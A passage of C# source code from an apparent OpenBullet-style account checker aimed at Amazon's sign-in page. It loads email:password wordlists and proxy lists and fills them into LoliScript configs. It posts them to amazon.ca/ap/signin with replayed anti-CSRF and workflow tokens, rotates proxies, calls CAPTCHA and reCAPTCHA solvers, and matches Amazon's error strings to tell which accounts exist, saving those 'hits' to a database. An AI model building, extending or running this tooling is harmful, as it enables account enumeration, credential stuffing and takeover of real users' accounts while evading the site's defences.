                    var trimmedLine = line.Trim();
                    
                    if ((trimmedLine.Contains("POST") && trimmedLine.Contains("\"http")) ||
                        (trimmedLine.StartsWith("#POST REQUEST") && trimmedLine.Contains("\"http")))
                    {
                        // Extract URL (handle both normal and commented format)
                        var urlMatch = System.Text.RegularExpressions.Regex.Match(trimmedLine, "\"(https?://[^\"]+)\"");
                        if (urlMatch.Success) url = urlMatch.Groups[1].Value;
                    }
                    else if (trimmedLine.StartsWith("CONTENT"))
                    {
                        // Extract POST content
                        var contentMatch = System.Text.RegularExpressions.Regex.Match(trimmedLine, "CONTENT \"([^\"]+)\"");
                        if (contentMatch.Success)
                        {
                            content = contentMatch.Groups[1].Value;
                            content = content.Replace("<USER>", email);
                            content = content.Replace("<PASS>", password);
                        }
                    }
                    else if (trimmedLine.StartsWith("HEADER"))
                    {
                        // Extract headers
                        var headerMatch = System.Text.RegularExpressions.Regex.Match(trimmedLine, "HEADER \"([^:]+):\\s*([^\"]+)\"");
                        if (headerMatch.Success)
                        {
                            headers[headerMatch.Groups[1].Value] = headerMatch.Groups[2].Value;
                        }
                    }
                }
                
                if (string.IsNullOrEmpty(url))
                {
                    return new HttpResult(false, "No URL found in request");
                }
                
                // Create POST request
                var requestContent = new System.Net.Http.StringContent(content, System.Text.Encoding.UTF8, "application/x-www-form-urlencoded");
                
                // Add headers
                foreach (var header in headers)
                {
                    try
                    {
                        if (header.Key.ToLower() == "content-type")
                        {
                            requestContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue(header.Value);
                        }
                        else
                        {
                            httpClient.DefaultRequestHeaders.TryAddWithoutValidation(header.Key, header.Value);
                        }
                    }
                    catch
                    {
                        // Ignore invalid headers
                    }
                }
                
                LogMessage($"🌐 Sending POST request to: {url}");
                
                // Send request
                var response = await httpClient.PostAsync(url, requestContent);
                var responseContent = await response.Content.ReadAsStringAsync();
                
                return new HttpResult(true, responseContent);
            }
            catch (Exception ex)
            {
                return new HttpResult(false, $"HTTP Request failed: {ex.Message}");
            }
        }
        
        private ExecutionResult ExecuteKeyCheck(string response, string script)
        {
            try
            {
                // Parse KEYCHECK section
                var lines = script.Split('\n');
                bool inKeyCheck = false;
                var successKeys = new List<string>();
                var failureKeys = new List<string>();
                string currentKeychain = "";
                
                foreach (var line in lines)
                {
                    var trimmedLine = line.Trim();
                    
                    if (trimmedLine.StartsWith("KEYCHECK"))
                    {
                        inKeyCheck = true;
                        continue;
                    }
                    
                    if (!inKeyCheck) continue;
                    
                    if (string.IsNullOrEmpty(trimmedLine)) break;
                    
                    if (trimmedLine.Contains("KEYCHAIN") && trimmedLine.Contains("Success"))
                    {
                        currentKeychain = "Success";
                    }
                    else if (trimmedLine.Contains("KEYCHAIN") && trimmedLine.Contains("Failure"))
                    {
                        currentKeychain = "Failure";
                    }
                    else if (trimmedLine.StartsWith("KEY"))
                    {
                        var keyMatch = System.Text.RegularExpressions.Regex.Match(trimmedLine, "KEY \"([^\"]+)\"");
                        if (keyMatch.Success)
                        {
                            var key = keyMatch.Groups[1].Value;
                            if (currentKeychain == "Success")
                                successKeys.Add(key);
                            else if (currentKeychain == "Failure")
                                failureKeys.Add(key);
                        }
                    }
                }
                
                // Check for success keys first
                foreach (var key in successKeys)
                {
                    if (response.Contains(key))
                    {
                        return new ExecutionResult(true, $"Success key found: {key}");
                    }
                }
                
                // Check for failure keys
                foreach (var key in failureKeys)
                {
                    if (response.Contains(key))
                    {
                        return new ExecutionResult(false, $"Failure key found: {key}");
                    }
                }
                
                // No keys matched - default to failure
                return new ExecutionResult(false, "No matching keys found in response");
            }
            catch (Exception ex)
            {
                return new ExecutionResult(false, $"KeyCheck error: {ex.Message}");
            }
        }
        
        private void StopRunner_Click(object sender, RoutedEventArgs e)
        {
            if (!isRunning) return;
            
            isRunning = false;
            btnStart.IsEnabled = true;
            btnStop.IsEnabled = false;
            btnPause.IsEnabled = false;
            statusText.Text = "Stopped";
            
            LogMessage("Runner stopped");
        }
        
        private void PauseRunner_Click(object sender, RoutedEventArgs e)
        {
            LogMessage("Runner paused (not implemented)");
        }
        

        
        private void LogMessage(string message)
        {
            Dispatcher.Invoke(() =>
            {
                txtBotLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {message}\n");
                txtBotLog.ScrollToEnd();
            });
        }
        
        // Title Bar Controls
        private void TitleBar_MouseLeftButtonDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            if (e.ButtonState == System.Windows.Input.MouseButtonState.Pressed)
                DragMove();
        }
        
        private void Minimize_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }
        
        private void Maximize_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState == WindowState.Maximized ? WindowState.Normal : WindowState.Maximized;
        }
        
        private void Close_Click(object sender, RoutedEventArgs e)
        {
            Close();
        }
        
        // Wordlist Management
        private void LoadWordlist_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new OpenFileDialog
            {
                Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*",
                Title = "Load Wordlist",
                InitialDirectory = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Wordlists")
            };
            
            if (dialog.ShowDialog() == true)
            {
                try
                {
                    currentWordlist = File.ReadAllLines(dialog.FileName)
                                         .Where(line => !string.IsNullOrWhiteSpace(line))
                                         .ToList();
                    
                    txtWordlistPath.Text = Path.GetFileName(dialog.FileName);
                    lblWordlistStatus.Text = $"✅ {currentWordlist.Count} entries loaded";
                    lblWordlistStatus.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Colors.LimeGreen);
                    statusText.Text = $"Wordlist loaded: {currentWordlist.Count} entries";
                    
                    LogMessage($"✅ Wordlist loaded: {currentWordlist.Count} entries from {Path.GetFileName(dialog.FileName)}");
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error loading wordlist: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    lblWordlistStatus.Text = "❌ Failed to load";
                    lblWordlistStatus.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Colors.Red);
                }
            }
        }
        
        // Proxy Management  
        private void LoadProxies_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new OpenFileDialog
            {
                Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*",
                Title = "Load Proxies"
            };
            
            if (dialog.ShowDialog() == true)
            {
                try
                {
                    currentProxies = File.ReadAllLines(dialog.FileName)
                                        .Where(line => !string.IsNullOrWhiteSpace(line))
                                        .ToList();
                    
                    lblProxyStatus.Text = $"✅ {currentProxies.Count} proxies loaded";
                    lblProxyStatus.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Colors.LimeGreen);
                    lblProxyCount.Text = $"Count: {currentProxies.Count}";
                    
                    LogMessage($"✅ Proxies loaded: {currentProxies.Count} proxies from {Path.GetFileName(dialog.FileName)}");
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error loading proxies: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    lblProxyStatus.Text = "❌ Failed to load";
                    lblProxyStatus.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Colors.Red);
                }
            }
        }
        
        private void TestProxies_Click(object sender, RoutedEventArgs e)
        {
            LogMessage("🧪 Testing proxy connectivity...");
            TestProxiesAsync();
        }
        
        private async void TestFiveEmails_Click(object sender, RoutedEventArgs e)
        {
            if (currentConfig == null)
            {
                MessageBox.Show("Please load a config first!", "No Config", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            
            LogMessage("🔬 DIAGNOSTIC TEST: Analyzing first 5 emails for Amazon response patterns");
            LogMessage("═══════════════════════════════════════════════════════════════════════");
            
            // Get first 5 emails for testing
            var testEmails = currentWordlist.Count > 0 ? 
                currentWordlist.Take(5).ToArray() : 
                new[] { 
                    "fakeemail12345@nonexistentdomain999.com:password123",
                    "totallybogusemail98765@nonexistent888.org:123456",
                    "admin@gmail.com:realpassword",  // Mix in a potentially real one
                    "test@example.com:test123",
                    "user@hotmail.com:password"
                };
            
            for (int i = 0; i < testEmails.Length; i++)
            {
                var testData = testEmails[i];
                var email = testData.Split(':')[0];
                
                LogMessage($"");
                LogMessage($"🔬 DIAGNOSTIC TEST #{i + 1}/5: {email}");
                LogMessage($"═══════════════════════════════════════════════════════════════");
                
                try
                {
                    var result = await ExecuteDetailedDiagnostic(testData);
                    LogMessage($"🎯 FINAL RESULT: {result.Message}");
                }
                catch (Exception ex)
                {
                    LogMessage($"❌ DIAGNOSTIC ERROR: {ex.Message}");
                }
                
                LogMessage($"═══════════════════════════════════════════════════════════════");
                
                // Small delay between tests
                await Task.Delay(2000);
            }
            
            LogMessage($"");
            LogMessage($"🔬 DIAGNOSTIC COMPLETE - Analyze the responses above to understand Amazon's behavior");
            LogMessage($"═══════════════════════════════════════════════════════════════════════");
        }
        
        private async Task<ExecutionResult> ExecuteDetailedDiagnostic(string dataLine)
        {
            try
            {
                var parts = dataLine.Split(':');
                var email = parts[0];
                var password = parts.Length > 1 ? parts[1] : "password123";
                
                LogMessage($"📧 Testing email: {email}");
                LogMessage($"🔐 Using password: {password} (NOTE: Will send EMPTY password as per .anom file)");
                
                // Get the script from current config
                var script = currentConfig?.Script ?? "";
                if (string.IsNullOrEmpty(script))
                {
                    return new ExecutionResult(false, "No script to execute");
                }
                
                // Replace variables - NOTE: password should be EMPTY as per .anom file
                script = script.Replace("<USER>", email);
                script = script.Replace("<PASS>", ""); // EMPTY PASSWORD for email existence check!
                
                LogMessage($"🔧 Script processing: Replaced <USER> with '{email}' and <PASS> with '' (empty)");
                
                // Parse LoliScript
                var commands = ParseAdvancedLoliScript(script);
                LogMessage($"📝 Parsed {commands.Count} LoliScript commands");
                
                // Execute the REQUEST command
                var response = "";
                foreach (var command in commands)
                {
                    if (command.Type == "REQUEST")
                    {
                        LogMessage($"🌐 Sending POST request to: {command.Url}");
                        LogMessage($"📦 POST content length: {command.Content?.Length ?? 0} chars");
                        LogMessage($"🔧 Content preview: {(command.Content?.Length > 200 ? command.Content.Substring(0, 200) + "..." : command.Content)}");
                        
                        response = await ExecuteRequestWithProxy(command, null);
                        
                        LogMessage($"📡 RESPONSE RECEIVED:");
                        LogMessage($"   📊 Length: {response.Length} chars");
                        LogMessage($"   ⚠️  SIZE COMPARISON: Normal=~84KB, Large=~86KB - Size differences may indicate different responses!");
                        
                        // Log first 1000 chars 
                        var responseStart = response.Length > 1000 ? response.Substring(0, 1000) + "..." : response;
                        LogMessage($"   📄 First 1000 chars: \n{responseStart}");
                        
                        // *** CRITICAL: CHECK MIDDLE SECTION WHERE DIFFERENCES MIGHT BE HIDDEN ***
                        if (response.Length > 4000)
                        {
                            int midStart = (response.Length / 2) - 1500;
                            int midLength = Math.Min(3000, response.Length - midStart);
                            var middleSection = response.Substring(midStart, midLength);
                            LogMessage($"   📄 MIDDLE section ({midStart}-{midStart + midLength}): \n{middleSection}");
                        }
                        
                        // Log last 1000 chars 
                        if (response.Length > 2000)
                        {
                            var responseEnd = response.Substring(response.Length - 1000);
                            LogMessage($"   📄 Last 1000 chars: ...{responseEnd}");
                        }
                        
                        // *** COMPREHENSIVE KEY ANALYSIS ***
                        LogMessage($"   🔍 KEY ANALYSIS:");
                        LogMessage($"      📊 Contains 'Sign-In ': {response.Contains("Sign-In ")}");
                        
                        // Check ALL failure patterns from .anom file
                        LogMessage($"      ❌ FAILURE PATTERNS:");
                        LogMessage($"         📊 'No account found with that email address1519': {response.Contains("No account found with that email address1519")}");
                        LogMessage($"         📊 'ap_ra_email_or_phone': {response.Contains("ap_ra_email_or_phone")}");
                        LogMessage($"         📊 'Please check your email address or click \"Create Account\"': {response.Contains("Please check your email address or click \"Create Account\"")}");
                        LogMessage($"         📊 'Incorrect phone number': {response.Contains("Incorrect phone number")}");
                        LogMessage($"         📊 'We cannot find an account with that mobile number': {response.Contains("We cannot find an account with that mobile number")}");
                        LogMessage($"         📊 'We cannot find an account with that e-mail address ': {response.Contains("We cannot find an account with that e-mail address ")}");
                        LogMessage($"         📊 'There was a problem': {response.Contains("There was a problem")}");
                        
                        // Check for other error patterns
                        LogMessage($"      🔍 OTHER PATTERNS:");
                        LogMessage($"         📊 'error' (lowercase): {response.ToLower().Contains("error")}");
                        LogMessage($"         📊 'invalid' (lowercase): {response.ToLower().Contains("invalid")}");
                        LogMessage($"         📊 'not found' (lowercase): {response.ToLower().Contains("not found")}");
                        LogMessage($"         📊 'password' field present: {response.ToLower().Contains("password")}");
                        LogMessage($"         📊 'email' mentions: {System.Text.RegularExpressions.Regex.Matches(response.ToLower(), "email").Count}");
                        LogMessage($"         📊 'phone' mentions: {System.Text.RegularExpressions.Regex.Matches(response.ToLower(), "phone").Count}");
                        
                        // Check for form fields and redirects
                        var inputCount = System.Text.RegularExpressions.Regex.Matches(response, "<input", System.Text.RegularExpressions.RegexOptions.IgnoreCase).Count;
                        LogMessage($"         📊 Input fields count: {inputCount}");
                        
                        // Look for JavaScript redirects or different behavior
                        if (response.Contains("window.location") || response.Contains("redirect"))
                        {
                            LogMessage($"         🚨 REDIRECT DETECTED - This might indicate account existence!");
                        }
                        
                        // *** SAVE COMPLETE RESPONSE TO FILE FOR DETAILED ANALYSIS ***
                        try
                        {
                            var logDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ResponseLogs");
                            Directory.CreateDirectory(logDir);
                            
                            var timestamp = DateTime.Now.ToString("HHmmss");
                            var filename = $"response_{email}_{timestamp}.html";
                            var filepath = Path.Combine(logDir, filename);
                            
                            var logContent = $@"PHONE NUMBER: {email}
TIMESTAMP: {DateTime.Now:yyyy-MM-dd HH:mm:ss}
RESPONSE LENGTH: {response.Length} chars
HTTP STATUS: OK
REQUEST URL: https://www.amazon.ca/ap/signin
REQUEST METHOD: POST

=== FULL HTML RESPONSE CONTENT ===
{response}

=== END OF RESPONSE ===";
                            
                            File.WriteAllText(filepath, logContent);
                            LogMessage($"         💾 FULL RESPONSE SAVED: ResponseLogs/{filename}");
                        }
                        catch (Exception ex)
                        {
                            LogMessage($"         ⚠️ Failed to save response log: {ex.Message}");
                        }
                        
                        break; // Only process first REQUEST command for diagnostics
                    }
                }
                
                // Now execute KEYCHECK with detailed analysis
                if (!string.IsNullOrEmpty(response))
                {
                    foreach (var command in commands)
                    {
                        if (command.Type == "KEYCHECK")
                        {
                            LogMessage($"🔍 EXECUTING KEYCHECK DIAGNOSTIC:");
                            return ExecuteDetailedKeyCheck(command, response, email);
                        }
                    }
                }
                
                return new ExecutionResult(false, "No response received");
            }
            catch (Exception ex)
            {
                return new ExecutionResult(false, $"Diagnostic error: {ex.Message}");
            }
        }
        
        private ExecutionResult ExecuteDetailedKeyCheck(LoliCommand command, string response, string email)
        {
            try
            {
                LogMessage($"   🔍 KEYCHECK ANALYSIS for {email}:");
                LogMessage($"   📋 Available keychains: {string.Join(", ", command.Keychains.Keys)}");
                
                // CRITICAL: Check FAILURE keys FIRST (as per .anom file structure)
                if (command.Keychains.ContainsKey("FAILURE"))
                {
                    LogMessage($"   ❌ CHECKING {command.Keychains["FAILURE"].Count} FAILURE KEYS FIRST:");
                    
                    foreach (var key in command.Keychains["FAILURE"])
                    {
                        var found = response.Contains(key);
                        LogMessage($"      🔍 '{key}' → {(found ? "FOUND ❌" : "NOT FOUND ✅")}");
                        
                        if (found)
                        {
                            LogMessage($"   🎯 FAILURE DETECTED: Email {email} does NOT exist in Amazon database");
                            return new ExecutionResult(false, $"INVALID: Amazon shows error '{key}'");
                        }
                    }
                    
                    LogMessage($"   ✅ NO FAILURE KEYS FOUND - Proceeding to check SUCCESS keys");
                }
                
                // Check SUCCESS keys only if no failures found
                if (command.Keychains.ContainsKey("SUCCESS"))
                {
                    LogMessage($"   ✅ CHECKING {command.Keychains["SUCCESS"].Count} SUCCESS KEYS:");
                    
                    foreach (var key in command.Keychains["SUCCESS"])
                    {
                        var found = response.Contains(key);
                        LogMessage($"      🔍 '{key}' → {(found ? "FOUND ✅" : "NOT FOUND ❌")}");
                        
                        if (found)
                        {
                            LogMessage($"   🎯 SUCCESS DETECTED: Email {email} EXISTS in Amazon database");
                            return new ExecutionResult(true, $"VALID: Amazon shows '{key}'");
                        }
                    }
                }
                
                LogMessage($"   ⚠️ NO EXPECTED KEYS FOUND - Amazon may be using anti-enumeration protection");
                return new ExecutionResult(false, "UNKNOWN: No expected patterns found");
            }
            catch (Exception ex)
            {
                return new ExecutionResult(false, $"Detailed keycheck error: {ex.Message}");
            }
        }
        
        private void ResetStatistics()
        {
            lock (statsLock)
            {
                keySignInCount = 0;
                keyNoAccountCount = 0;
                keyEmailPhoneCount = 0;
                keyOthersCount = 0;
                httpErrorCount = 0;
                totalResponseTime = 0;
                totalResponseSize = 0;
                responseCount = 0;
            }
            
            Dispatcher.Invoke(() =>
            {
                lblTested.Text = "0";
                lblHits.Text = "0";
                lblFails.Text = "0";
                lblQuickHits.Text = "0";
                lblQuickFails.Text = "0";
                lblCPM.Text = "0";
                lblQuickCPM.Text = "0";
                lblSuccessRate.Text = "0%";
                lblKeySignIn.Text = "0";
                lblKeyNoAccount.Text = "0";
                lblKeyEmailPhone.Text = "0";
                lblKeyOthers.Text = "0";
                lblAvgResponseTime.Text = "0ms";
                lblAvgResponseSize.Text = "0KB";
                lblHttpErrors.Text = "0";
                progressBar.Value = 0;
                lblProgressText.Text = "Initializing...";
            });
            
            LogMessage("📊 Statistics reset for new run");
        }
        
        // Amazon token extraction (Original OpenBullet approach)
        private AmazonTokens ExtractAmazonTokens(string html)
        {
            try
            {
                LogMessage($"🔍 Extracting fresh Amazon tokens from {html.Length} char response...");
                
                var tokens = new AmazonTokens();
                
                // Extract appActionToken (critical for Amazon requests)
                var appActionMatch = System.Text.RegularExpressions.Regex.Match(html, 
                    @"name=[""']appActionToken[""']\s+value=[""']([^""']+)[""']", 
                    System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                if (appActionMatch.Success)
                {
                    tokens.AppActionToken = appActionMatch.Groups[1].Value;
                    LogMessage($"✅ Found fresh appActionToken: {tokens.AppActionToken.Substring(0, Math.Min(50, tokens.AppActionToken.Length))}...");
                }
                
                // Extract metadata1 (Amazon's tracking data)
                var metadataMatch = System.Text.RegularExpressions.Regex.Match(html, 
                    @"name=[""']metadata1[""']\s+value=[""']([^""']+)[""']", 
                    System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                if (metadataMatch.Success)
                {
                    tokens.Metadata1 = System.Uri.UnescapeDataString(metadataMatch.Groups[1].Value);
                    LogMessage($"✅ Found fresh metadata1: {tokens.Metadata1.Length} chars");
                }
                
                // Extract workflowState (Amazon's session state)
                var workflowMatch = System.Text.RegularExpressions.Regex.Match(html, 
                    @"name=[""']workflowState[""']\s+value=[""']([^""']+)[""']", 
                    System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                if (workflowMatch.Success)
                {
                    tokens.WorkflowState = workflowMatch.Groups[1].Value;
                    LogMessage($"✅ Found fresh workflowState: {tokens.WorkflowState.Length} chars");
                }
                
                // Extract CSRF token if present
                var csrfMatch = System.Text.RegularExpressions.Regex.Match(html, 
                    @"name=[""']csrf[""']\s+value=[""']([^""']+)[""']", 
                    System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                if (csrfMatch.Success)
                {
                    tokens.CsrfToken = csrfMatch.Groups[1].Value;
                    LogMessage($"✅ Found CSRF token: {tokens.CsrfToken}");
                }
                
                // Extract session-id if present
                var sessionMatch = System.Text.RegularExpressions.Regex.Match(html, 
                    @"session.*?[""']([0-9\-]+)[""']", 
                    System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                if (sessionMatch.Success)
                {
                    tokens.SessionId = sessionMatch.Groups[1].Value;
                    LogMessage($"✅ Found session ID: {tokens.SessionId}");
                }
                
                return tokens;
            }
            catch (Exception ex)
            {
                LogMessage($"❌ Token extraction error: {ex.Message}");
                return new AmazonTokens();
            }
        }
        
        private string BuildPostContent(string originalContent, AmazonTokens freshTokens)
        {
            try
            {
                LogMessage($"🔧 Building POST content with fresh tokens...");
                
                // Start with original content from config
                var content = originalContent ?? "";
                
                // Replace old tokens with fresh ones if we extracted them
                if (!string.IsNullOrEmpty(freshTokens.AppActionToken))
                {
                    // Replace the old appActionToken with fresh one
                    content = System.Text.RegularExpressions.Regex.Replace(content, 
                        @"appActionToken=[^&]+", 
                        $"appActionToken={System.Uri.EscapeDataString(freshTokens.AppActionToken)}");
                    LogMessage($"✅ Replaced appActionToken with fresh token");
                }
                
                if (!string.IsNullOrEmpty(freshTokens.Metadata1))
                {
                    // Replace the old metadata1 with fresh one
                    content = System.Text.RegularExpressions.Regex.Replace(content, 
                        @"metadata1=[^&]+", 
                        $"metadata1={System.Uri.EscapeDataString(freshTokens.Metadata1)}");
                    LogMessage($"✅ Replaced metadata1 with fresh data");
                }
                
                if (!string.IsNullOrEmpty(freshTokens.WorkflowState))
                {
                    // Replace the old workflowState with fresh one
                    content = System.Text.RegularExpressions.Regex.Replace(content, 
                        @"workflowState=[^&]+", 
                        $"workflowState={System.Uri.EscapeDataString(freshTokens.WorkflowState)}");
                    LogMessage($"✅ Replaced workflowState with fresh state");
                }
                
                LogMessage($"🔧 Final POST content: {content.Length} chars (fresh tokens applied)");
                return content;
            }
            catch (Exception ex)
            {
                LogMessage($"❌ POST content building error: {ex.Message} - using original content");
                return originalContent ?? "";
            }
        }
        
        private void InitializeApplication()
        {
            try
            {
                // Ensure DB directory exists
                Directory.CreateDirectory("DB");
                
                // Welcome message
                LogMessage("🎯 OpenBullet Anomaly Clone v2.0 Professional - Ready!");
                LogMessage("📁 To get started:");
                LogMessage("   1. Load a config (.anom file)");
                LogMessage("   2. Load a wordlist (.txt file) or use built-in test data");
                LogMessage("   3. Optionally load proxies for rotation");
                LogMessage("   4. Click START to begin checking");
                LogMessage("");
                LogMessage("💡 This Amazon checker tests EMAIL EXISTENCE (not login credentials)");
                LogMessage("✅ HIT = Email exists in Amazon database");
                LogMessage("❌ FAIL = Email not found in Amazon database");
                LogMessage("");
                
                // Check if sample files exist
                if (File.Exists("../amazonChecker.anom"))
                {
                    LogMessage("📂 Sample config found: amazonChecker.anom");
                }
                
                if (Directory.Exists("../Wordlists") && Directory.GetFiles("../Wordlists", "*.txt").Length > 0)
                {
                    var wordlistFiles = Directory.GetFiles("../Wordlists", "*.txt");
                    LogMessage($"📋 {wordlistFiles.Length} wordlist file(s) found in Wordlists folder");
                }
                
                statusText.Text = "Ready - Load config and wordlist to begin email existence checking";
            }
            catch (Exception ex)
            {
                LogMessage($"⚠️ Initialization warning: {ex.Message}");
            }
        }
        
        private async void TestProxiesAsync()
        {
            if (currentProxies.Count == 0)
            {
                LogMessage("❌ No proxies loaded to test");
                return;
            }
            
            LogMessage($"🧪 Testing {currentProxies.Count} proxies...");
            var workingProxies = 0;
            
            var tasks = currentProxies.Select(async proxy =>
            {
                try
                {
                    var parts = proxy.Split(':');
                    if (parts.Length != 2) return false;
                    
                    var handler = new HttpClientHandler()
                    {
                        Proxy = new System.Net.WebProxy(parts[0], int.Parse(parts[1])),
                        UseProxy = true
                    };
                    
                    using (var client = new HttpClient(handler))
                    {
                        client.Timeout = TimeSpan.FromSeconds(10);
                        var response = await client.GetAsync("http://httpbin.org/ip");
                        return response.IsSuccessStatusCode;
                    }
                }
                catch
                {
                    return false;
                }
            });
            
            var results = await Task.WhenAll(tasks);
            workingProxies = results.Count(r => r);
            
            LogMessage($"✅ Proxy test completed: {workingProxies}/{currentProxies.Count} working");
            lblProxyStatus.Text = $"✅ {workingProxies}/{currentProxies.Count} working";
        }
        
        private string GetNextProxy()
        {
            if (currentProxies.Count == 0) return null;
            
            lock (proxyLock)
            {
                var proxy = currentProxies[proxyIndex];
                proxyIndex = (proxyIndex + 1) % currentProxies.Count;
                return proxy;
            }
        }
        
        private async Task<ExecutionResult> ExecuteLoliScriptWithProxy(string dataLine, string proxy)
        {
            try
            {
                // Parse data line (email:password format)
                var parts = dataLine.Split(':');
                if (parts.Length < 2)
                {
                    return new ExecutionResult(false, "Invalid data format");
                }
                
                var email = parts[0];
                var password = parts[1];
                
                LogMessage($"⚡ Bot executing with proxy: {proxy ?? "DIRECT"}");
                
                // Get the script from current config
                var script = currentConfig?.Script ?? "";
                if (string.IsNullOrEmpty(script))
                {
                    return new ExecutionResult(false, "No script to execute");
                }
                
                // Replace variables according to LoliScript specs (<USER>, <PASS>)
                script = script.Replace("<USER>", email);
                script = script.Replace("<PASS>", password);
                
                // Parse LoliScript according to LSDoc.xml specifications
                var commands = ParseAdvancedLoliScript(script);
                
                LogMessage($"📝 Parsed {commands.Count} LoliScript commands");
                
                // Execute commands in sequence with advanced features
                var response = "";
                var variables = new Dictionary<string, string>();
                
                foreach (var command in commands)
                {
                    if (command.Type == "REQUEST")
                    {
                        LogMessage($"🌐 Executing REQUEST with proxy: {proxy ?? "DIRECT"}");
                        response = await ExecuteRequestWithProxy(command, proxy);
                        LogMessage($"📡 Response length: {response.Length} chars");
                    }
                    else if (command.Type == "KEYCHECK")
                    {
                        LogMessage($"🔍 Executing KEYCHECK with {command.Keychains.Count} keychains");
                        return ExecuteKeyCheckCommand(command, response);
                    }
                    else if (command.Type == "PARSE")
                    {
                        LogMessage($"🔧 Executing PARSE command");
                        var parseResult = AdvancedExecutionMethods.ExecuteParseCommand(command, response);
                        variables[command.OutputVariable] = parseResult;
                    }
                    else if (command.Type == "CAPTCHA")
                    {
                        LogMessage($"🤖 Solving CAPTCHA...");
                        var captchaResult = await AdvancedExecutionMethods.SolveCaptcha(command.Url);
                        variables[command.OutputVariable] = captchaResult;
                    }
                    else if (command.Type == "RECAPTCHA")
                    {
                        LogMessage($"🛡️ Solving reCAPTCHA...");
                        var recaptchaResult = await AdvancedExecutionMethods.SolveRecaptcha(command.Url, command.SiteKey);
                        variables[command.OutputVariable] = recaptchaResult;
                    }
                    else if (command.Type == "NAVIGATE")
                    {
                        LogMessage($"🌐 Browser navigation: {command.Url}");
                        await AdvancedExecutionMethods.ExecuteSeleniumNavigation(command.Url);
                    }
                    else if (command.Type == "BROWSERACTION")
                    {
                        LogMessage($"🎮 Browser action: {command.Action}");
                        await AdvancedExecutionMethods.ExecuteSeleniumAction(command.Action, command.Input);
                    }
                }
                
                return new ExecutionResult(false, "No KEYCHECK found in script");
            }
            catch (Exception ex)
            {
                return new ExecutionResult(false, $"Advanced LoliScript execution error: {ex.Message}");
            }
        }
        
        private async Task SaveHitToDatabase(string account, string details, string proxy = "", long responseTime = 0, long responseSize = 0, string detectionKey = "", string fullResponse = "")
        {
            try
            {
                var parts = account.Split(':');
                var email = parts.Length > 0 ? parts[0] : account;
                
                using (var db = new LiteDB.LiteDatabase("DB/Hits.db"))
                {
                    var hits = db.GetCollection<HitRecord>("hits");
                    hits.Insert(new HitRecord
                    {
                        Email = email,
                        FullAccount = account,
                        AccountExists = details.Contains("VALID"),
                        DetectionKey = detectionKey,
                        ResponseType = details.Contains("VALID") ? "account_exists" : "account_not_found",
                        HttpStatusCode = 200, // Default - could be enhanced
                        RedirectUrl = "", // Could be enhanced with redirect detection
                        ResponseTime = responseTime,
                        ResponseSize = responseSize,
                        ProxyUsed = proxy ?? "DIRECT",
                        Timestamp = DateTime.Now,
                        ConfigName = currentConfig?.Settings?.Name ?? "Unknown",
                        FullResponse = fullResponse.Length > 1000 ? fullResponse.Substring(0, 1000) + "..." : fullResponse // Truncate for storage
                    });
                }
                LogMessage($"💾 Enhanced hit record saved: {email} ({responseTime}ms, {responseSize/1024}KB)");
            }
            catch (Exception ex)
            {
                LogMessage($"❌ Database save error: {ex.Message}");
            }
        }
    }
    
    // Helper classes
    public class ExecutionResult
    {
        public bool IsSuccess { get; }
        public string Message { get; }
        
        public ExecutionResult(bool isSuccess, string message)
        {
            IsSuccess = isSuccess;
            Message = message;
        }
    }
    
    public class HttpResult
    {
        public bool IsSuccess { get; }
        public string Content { get; }
        
        public HttpResult(bool isSuccess, string content)
        {
            IsSuccess = isSuccess;
            Content = content;
        }
    }
    
    public class HitRecord
    {
        public string Email { get; set; } = "";
        public string FullAccount { get; set; } = "";
        public bool AccountExists { get; set; } = false;
        public string DetectionKey { get; set; } = "";
        public string ResponseType { get; set; } = "";
        public int HttpStatusCode { get; set; } = 0;
        public string RedirectUrl { get; set; } = "";
        public long ResponseTime { get; set; } = 0;
        public long ResponseSize { get; set; } = 0;
        public string ProxyUsed { get; set; } = "";
        public DateTime Timestamp { get; set; }
        public string ConfigName { get; set; } = "";
        public string FullResponse { get; set; } = ""; // For analysis
    }
    
    // Amazon token extraction class (for dynamic token management)
    public class AmazonTokens
    {
        public string AppActionToken { get; set; } = "";
        public string Metadata1 { get; set; } = "";
        public string WorkflowState { get; set; } = "";
        public string CsrfToken { get; set; } = "";
        public string SessionId { get; set; } = "";
        public DateTime ExtractedAt { get; set; } = DateTime.Now;
        
        public bool HasValidTokens => !string.IsNullOrEmpty(AppActionToken) && 
                                     !string.IsNullOrEmpty(Metadata1) && 
                                     !string.IsNullOrEmpty(WorkflowState);
    }
    
    // Helper class for LoliScript commands (moved to namespace level)
    public class LoliCommand
    {
        public string Type { get; set; } = "";
        public string Method { get; set; } = "";
        public string Url { get; set; } = "";
        public string Content { get; set; } = "";
        public string ContentType { get; set; } = "";
        public List<string> Headers { get; set; } = new List<string>();
        public Dictionary<string, List<string>> Keychains { get; set; } = new Dictionary<string, List<string>>();
        
        // Advanced command properties
        public string OutputVariable { get; set; } = "";
        public string SiteKey { get; set; } = "";
        public string Action { get; set; } = "";
        public string Input { get; set; } = "";
        public string ParseType { get; set; } = "";
        public string ParseTarget { get; set; } = "";
        public string ParseLeft { get; set; } = "";
